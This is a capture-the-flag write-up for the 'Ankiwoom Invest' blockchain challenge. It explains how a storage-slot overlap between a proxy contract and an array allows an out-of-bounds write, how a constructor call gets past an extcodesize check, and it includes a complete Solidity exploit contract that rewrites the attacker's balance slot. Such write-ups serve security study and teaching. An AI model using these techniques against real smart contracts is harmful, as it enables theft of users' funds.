# Ankiwoom Invest

**Author**: Robin_Jadoul

**Tags:** blockchain

**Points:** 964 (11 solves)

**Description:** 

> What do you think about if stock-exchange server is running on blockchain? Can you buy codegate stock?
> 
> service: nc 13.125.194.44 20000
>
> rpc: http://13.125.194.44:8545
>
> faucet: http://13.125.194.44:8080
>
> network info: mainnet, petersburg

The `info` struct in the `Proxy` contract overlaps with the storage slot of the `donaters` dynamic array in the `Investment` contract. This means that whenever `info` is written, if overwrites the length of `donaters` and hence we can achieve an out-of-bounds write. Observe that since the `msg.sender` address is written to the upper part of the length, we are likely to have enough reach to overwrite arbitrary interesting storage variables and in particular target our own balance.
Since we need an "invalid" `lastDonater` when using `modifyDonater`, we have to make sure that the `lastDonater` slot contains the address of a contract and a regular user address. That introduces the problem that we need to look like a regular address when performing the donation. To get around it, we can simply perform the setup and donation in the constructor of our contract, before we can be observed to have any nonzero `extcodesize`. Afterwards, we do the final steps from a regular contract function so that then the extcodesize is no longer seen as 0.

Some calculation on the storage addresses, a lot of fighting with the interaction with the RPC, and hoping our contract address is large enough to span the gap later, we get the flag.

**Exploit contract:**
```solidity 
import {Investment} from "./Investment.sol";
import {Proxy} from "./Proxy.sol";

contract Sploit {
    Investment target;

    constructor(Investment _t) {
        target = _t;
        target.init();
        // Get some moneh
        target.mint();
        // Buy stonks to donate
        target.buyStock("amd", 1);
        // Donate so we have a contract lastDonater and can modifyDonater
        // Do it in the constructor so somehow it seems like we're a user
        target.donateStock(address(this), "amd", 1);
    }
    fallback() external payable {}

    function continuesploit() public {
        target.modifyDonater(1); // no clue if this was needed, probably not but I added it before the solution suddenly started to work ¯\_(ツ)_/¯

        // Modify stuff, now we're a contract and no longer a user :)
        uint256 base_address = uint256(keccak256(abi.encode(uint256(2)))); // donaters
        uint256 mapping_slot = 7; // Balances
        address mapping_key = address(this);
        uint256 goal = uint256(keccak256(abi.encode(mapping_key, mapping_slot)));

        require(goal > base_address, "Wrong overflow");

        target.modifyDonater(goal - base_address);
        target.buyStock("codegate", 1);
        target.isSolved();
    }
}
```